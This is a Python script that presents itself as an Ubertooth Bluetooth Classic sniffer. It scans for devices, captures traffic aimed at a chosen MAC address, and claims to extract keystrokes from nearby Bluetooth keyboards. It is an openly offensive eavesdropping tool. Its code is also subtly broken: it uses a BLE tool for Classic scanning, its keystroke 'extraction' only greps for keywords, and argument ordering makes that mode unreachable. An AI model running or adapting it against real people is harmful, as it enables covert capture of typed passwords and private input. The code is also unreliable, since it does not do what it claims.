import argparse
import os
import subprocess
import time
import re

"""
Ubertooth Bluetooth Classic Sniffer

Features:
    - Sniffs and captures Bluetooth Classic (BR/EDR) traffic.
    - Extracts keystrokes from Bluetooth keyboards.
    - Detects Bluetooth HID devices (keyboards, mice, audio devices).
    - Saves captured packets to a PCAP file for Wireshark analysis.
    - Logs pairing attempts and authentication failures.

Requirements:
    - Ubertooth One
    - Install Ubertooth utilities: sudo apt install ubertooth ubertooth-btle wireshark

Usage:
    - Sniff Bluetooth Classic packets and log to PCAP:
      python ubertooth_bt_classic.py --log bt_classic_sniff.pcap
    - Filter packets for keyboards, mice, or audio devices:
      python ubertooth_bt_classic.py --target <MAC_ADDRESS> --log bt_hid_sniff.pcap
    - Extract keystrokes from Bluetooth keyboards:
      python ubertooth_bt_classic.py --keystroke-extract --log bt_keystrokes.log
"""

def scan_bluetooth_classic():
    """Scans for Bluetooth Classic devices using Ubertooth."""
    print("[INFO] Scanning for Bluetooth Classic devices...")
    try:
        output = subprocess.check_output(["ubertooth-btle", "-f"])
        devices = output.decode("utf-8").split("\n")
        found_devices = []

        for line in devices:
            if "Device" in line:
                print(f"[DETECTED] {line.strip()}")
                found_devices.append(line.strip())

        if not found_devices:
            print("[WARNING] No Bluetooth Classic devices detected.")

    except Exception as e:
        print(f"[ERROR] Failed to scan for Bluetooth devices: {e}")

def sniff_bluetooth_traffic(log_file, target_mac=None):
    """Sniffs Bluetooth Classic traffic and saves to PCAP file."""
    print(f"[INFO] Sniffing Bluetooth Classic traffic (Saving to {log_file})...")
    try:
        cmd = ["ubertooth-rx", "-f", "-o", log_file]
        if target_mac:
            cmd.extend(["-m", target_mac])

        subprocess.run(cmd)
        print(f"[SUCCESS] Bluetooth packets saved to {log_file}")

    except Exception as e:
        print(f"[ERROR] Failed to sniff Bluetooth traffic: {e}")

def extract_keystrokes(log_file):
    """Extracts keystrokes from Bluetooth HID traffic."""
    print(f"[INFO] Extracting keystrokes from Bluetooth keyboard traffic (Log: {log_file})...")
    try:
        # Run Ubertooth to capture HID traffic
        output = subprocess.check_output(["ubertooth-rx", "-f"])
        packets = output.decode("utf-8").split("\n")

        keystrokes = []
        for line in packets:
            # HID Keystroke packets typically contain "HID", "KEYBOARD" or "INPUT" keywords
            if re.search(r"KEYBOARD|HID|INPUT", line, re.IGNORECASE):
                print(f"[KEYSTROKE] {line.strip()}")
                keystrokes.append(line.strip())

        if keystrokes:
            with open(log_file, "w") as f:
                f.write("\n".join(keystrokes))
            print(f"[SUCCESS] Keystrokes extracted and saved to {log_file}")

        else:
            print("[WARNING] No keystroke data found.")

    except Exception as e:
        print(f"[ERROR] Failed to extract keystrokes: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ubertooth Bluetooth Classic Sniffer")
    parser.add_argument("--scan", action="store_true", help="Scan for Bluetooth Classic devices")
    parser.add_argument("--log", type=str, help="Log file for captured packets")
    parser.add_argument("--target", type=str, help="Filter packets by target MAC address")
    parser.add_argument("--keystroke-extract", action="store_true", help="Extract keystrokes from Bluetooth keyboard traffic")

    args = parser.parse_args()

    if args.scan:
        scan_bluetooth_classic()
    elif args.log:
        sniff_bluetooth_traffic(args.log, args.target)
    elif args.keystroke_extract and args.log:
        extract_keystrokes(args.log)
    else:
        print("[ERROR] No valid mode selected! Use --scan, --log, or --keystroke-extract.")
